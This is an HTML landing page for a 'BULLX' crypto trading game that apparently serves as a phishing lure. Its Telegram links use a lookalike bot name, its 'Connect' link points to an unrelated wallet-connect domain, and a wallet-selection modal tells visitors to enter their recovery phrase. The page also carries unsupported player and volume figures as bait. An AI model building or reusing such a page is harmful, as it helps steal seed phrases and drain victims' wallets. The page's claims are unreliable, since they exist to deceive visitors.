<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bull vs Bear Trading Game</title>
  <style>
    :root {
      --primary: #1c1c1c;
      --secondary: #2d2d2d;
      --accent: #00ff88;
      --text: #ffffff;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: var(--primary);
      color: var(--text);
    }

    nav {
      padding: 1rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--secondary);
    }

    .logo {
      font-size: 2rem;
      font-weight: bold;
      color: var(--accent);
    }

    .nav-links {
      display: flex;
      gap: 2rem;
    }

    .nav-links a {
      color: var(--text);
      text-decoration: none;
      font-weight: 500;
    }

    .hero {
      min-height: 80vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 2rem;
    }

    .hero h1 {
      font-size: 4rem;
      margin-bottom: 1rem;
    }

    .hero p {
      font-size: 1.5rem;
      margin-bottom: 2rem;
      color: #888;
    }

    .cta-button {
      background: var(--accent);
      color: var(--primary);
      padding: 1rem 2rem;
      border-radius: 0.5rem;
      text-decoration: none;
      font-weight: bold;
      font-size: 1.2rem;
      transition: transform 0.2s;
    }

    .cta-button:hover {
      transform: scale(1.05);
    }

    .chart-container {
      width: 100%;
      max-width: 1200px;
      margin: 0 auto;
      padding: 2rem;
      background: var(--secondary);
      border-radius: 1rem;
    }

    .game-stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 2rem;
      padding: 2rem;
      max-width: 1200px;
      margin: 0 auto;
    }

    .stat-card {
      background: var(--secondary);
      padding: 2rem;
      border-radius: 1rem;
      text-align: center;
    }

    .stat-card h3 {
      color: var(--accent);
      margin-bottom: 0.5rem;
    }

    @keyframes float {
      0% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
      100% { transform: translateY(0); }
    }

    .floating-icon {
      animation: float 3s ease-in-out infinite;
    }

    /* Modal styling */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: var(--primary);
      padding: 2rem;
      border-radius: 1rem;
      max-width: 500px;
      width: 90%;
      text-align: center;
    }

    .wallet-list {
      margin-top: 1rem;
    }

    .wallet-list button {
      display: block;
      width: 100%;
      padding: 0.5rem;
      margin: 0.5rem 0;
      background: var(--accent);
      color: var(--primary);
      border: none;
      border-radius: 0.5rem;
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <nav>
    <div class="logo">BULLX</div>
    <div class="nav-links">
      <a href="https://t.me/BuIlx_bot">Trade</a>
      <a href="https://t.me/BuIlx_bot">Leaderboard</a>
      <a href="https://multichainsweb3connect.stormkit.dev" id="connectButton">Connect</a> <!-- Updated link -->
    </div>
  </nav>

  <main>
    <section class="hero">
      <h1>Trade The Future</h1>
      <p>Experience the thrill of trading without the risk</p>
      <a href="https://t.me/BuIlx_bot" class="cta-button">Start Trading Now</a>
    </section>

    <div class="chart-container">
      <svg class="floating-icon" width="100%" height="400" viewBox="0 0 1200 400">
        <!-- Simple candlestick chart visualization -->
        <path d="M0,200 Q300,100 600,300 T1200,200" stroke="var(--accent)" fill="none" stroke-width="2"/>
        <path d="M0,200 Q300,300 600,100 T1200,200" stroke="var(--accent)" fill="none" stroke-width="2" opacity="0.5"/>
      </svg>
    </div>

    <div class="game-stats">
      <div class="stat-card">
        <h3>Active Players</h3>
        <p>10,000+</p>
      </div>
      <div class="stat-card">
        <h3>Daily Trades</h3>
        <p>100,000+</p>
      </div>
      <div class="stat-card">
        <h3>Total Volume</h3>
        <p>$500M+</p>
      </div>
    </div>
  </main>

  <!-- Modal for wallet connection -->
  <div class="modal" id="walletModal">
    <div class="modal-content">
      <h3>Select Wallet</h3>
      <div class="wallet-list">
        <button onclick="connectWallet('Phantom')">Phantom Wallet</button>
        <button onclick="connectWallet('Solflare')">Solflare Wallet</button>
        <button onclick="connectWallet('Sollet')">Sollet Wallet</button>
      </div>
      <p style="margin-top: 1rem; color: #888;">Enter your recovery phrase to connect.</p>
    </div>
  </div>
</body>
</html>
